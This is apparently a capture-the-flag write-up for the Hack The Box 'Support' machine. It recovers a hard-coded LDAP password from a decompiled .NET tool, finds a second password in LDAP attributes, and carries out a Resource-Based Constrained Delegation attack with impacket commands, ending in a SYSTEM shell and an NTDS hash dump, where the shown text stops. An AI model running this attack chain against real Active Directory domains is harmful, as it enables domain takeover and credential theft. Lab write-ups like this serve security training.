## Enumeration

```
❯ nxc smb support.htb -u 'a' -p '' --users
```

Guest logon is enabled, let's try enumerate shares

![Description](/static/images/htb/windows/support/1.jpg)

```
❯ smbclient -L support.htb -U a%
```

![Description](/static/images/htb/windows/support/2.jpg)

Interesting non-default share available, `support-tools`

```
❯ smbclient //support.htb/support-tools -U a%
```

![Description](/static/images/htb/windows/support/3.jpg)

Apart from the other programs, we can notice an interesting zip file called `UserInfo.exe.zip`. Unzipping it will give us some DLLs that
are probably required to run the program and the executable itself. We also find that the executable is a .NET application

![Description](/static/images/htb/windows/support/4.jpg)

We can utlize a .NET debugger like dnSpy to debug and disassemble the application

![Description](/static/images/htb/windows/support/5.jpg)

We can analyse a few functions after decompiling but the `LdapQuery` class seems to authenticate a user named `ldap` against the LDAP server,
furthermore, we can notice that is retrieving a string called `password` from the `Protected` class using the `getPassword()` function

![Description](/static/images/htb/windows/support/6.jpg)

Analyzing the said class reveals an encoded string with a key. It seems there is some sort of XOR encryption going on here

![Description](/static/images/htb/windows/support/7.jpg)

Encoeded Base64 string:

```
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
```

Key that is used for XOR:

```
private static byte[] key = Encoding.ASCII.GetBytes("armando");
```

Now the function `getPassword()` first decodes the Base64 string into a byte array, then does a for loop that each byte is
XORed with a byte from the key with a constant of `223`

```
public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(Protected.enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = array[i] ^ Protected.key[i % Protected.key.Length] ^ 223;
			}
			return Encoding.Default.GetString(array2);
		}
```

We can try to write a script that replicates the decryption process

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

data = base64.b64decode(enc_password)
decrypted = bytearray()

for i in range(len(data)):
	decrypted_byte = data[i] ^ key[i % len(key)] ^ 223
	decrypted.append(decrypted_byte)

password = decrypted.decode('utf-8')

print(f'Decrypted password: {password}')
```

```
❯ python3 decrypt.py

Decrypted password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Let us verify the credentials

![Description](/static/images/htb/windows/support/8.jpg)

Yep, we got it

Enumerate users

```
❯ nxc smb support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users
```

![Description](/static/images/htb/windows/support/9.jpg)

We can go ahead and put them in a list. Initially, I queried for Bloodhound data but LDAP was bugging out at the moment.
Anyways, we can see the username, `ldap` is probably hinting at LDAP enumeration so that's what we're going to do.

```
❯ nxc ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --query "(objectclass=*)" ""
```

This LDAP query returns every object from the LDAP server. It is a bit messy so I used `ldapdomaindump` instead for a more structured
output

```
❯ ldapdomaindump -u support.htb\\ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' ldap://10.129.230.181 -o ldap
```

![Description](/static/images/htb/windows/support/10.jpg)

Going through the user objects carefully we will notice what looks like a password for the user `support`

![Description](/static/images/htb/windows/support/11.jpg)

Verify them

![Description](/static/images/htb/windows/support/12.jpg)

Valid, lets goo. Lets us try querying for Bloodhound data

```
❯ nxc ldap support.htb -u 'support' -p 'Ironside47pleasure40Watchful' --dns-server 10.129.230.181 --bloodhound --collection All
```

![Description](/static/images/htb/windows/support/13.jpg)

![Description](/static/images/htb/windows/support/14.jpg)

Finally works bruh, we can see user `support` is a member of the Remote Management Users group. We can easily retrieve
the user flag

![Description](/static/images/htb/windows/support/15.jpg)

User `support` is also a member of the `Shared Support Account` which has `GenericAll` over a computer account which is
the Domain Controller itself

![Description](/static/images/htb/windows/support/16.jpg)

If we click on the ACE and check the left pane, Bloodhound provides a somewhat step by step exploitation technique and explanation
of the vulnerability

![Description](/static/images/htb/windows/support/17.jpg)

In this case, the vulnerability is a Resource-Based Constrained Delegation. Now, what in the world is that? Imagine a database service
that can be set up to allow specific services, like a web service, to act on behalf of users through assigned security permissions.

Simply put, its a feature that enables administrators to delegate permissions in order to manage resources more securely. This is a great & very detailed [article](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html) about it

So I am going to do this in 2 methods, the easy method and the manual method to further explore the requirements of this attack

# The Easy Method

We can just follow what Bloodhound suggested with 3 commands. First, we need to add a rogue computer

```
❯ impacket-addcomputer -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Password123!' -dc-host 10.129.238.56 'support.htb/support:Ironside47pleasure40Watchful'
```

![Description](/static/images/htb/windows/support/18.jpg)

Next, we need to delegate from the rogue computer to the target computer

```
❯ impacket-rbcd -delegate-from ATTACKERSYSTEM$ -delegate-to DC$ -action write support.htb/support:Ironside47pleasure40Watchful -dc-ip 10.129.238.56
```

![Description](/static/images/htb/windows/support/19.jpg)

Then, we request a Service Ticket for the service name we want to impersonate `Administrator`, In this case, its the CIFS service

```
❯ impacket-getST -spn cifs/dc.support.htb -impersonate Administrator support.htb/ATTACKERSYSTEM$:Password123!
```

![Description](/static/images/htb/windows/support/20.jpg)

By now, we should have the ticket generated, all that's left is to export it to the `KRB5CCNAME` variable

```
❯ export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

We can `psexec` using the Kerberos ticket and we will land a SYSTEM session and can grab the root ticket

```
❯ impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
```

![Description](/static/images/htb/windows/support/21.jpg)

Oh as a bonus we can also dump everyones NTLM hashes from NTDS.dit using secretsdump

```
❯ impacket-secretsdump -k DC.support.htb
